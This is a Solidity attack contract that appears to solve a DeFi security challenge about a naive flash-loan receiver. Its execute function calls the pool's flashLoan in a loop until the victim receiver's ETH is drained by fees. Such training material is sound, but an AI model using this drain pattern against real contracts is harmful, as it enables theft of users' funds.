// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

/**
 * @title AttackNaiveFlashLoanReceiver
 * @author 
 */
contract AttackNaiveFlashLoanReceiver{
    function execute( address payable _pool, IERC3156FlashBorrower receiver) public{
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool( _pool);

        while( address(receiver).balance >0){
            pool.flashLoan(
                receiver,
                pool.ETH(),
                10 ether,
                '0x'
            );
        }
    }
}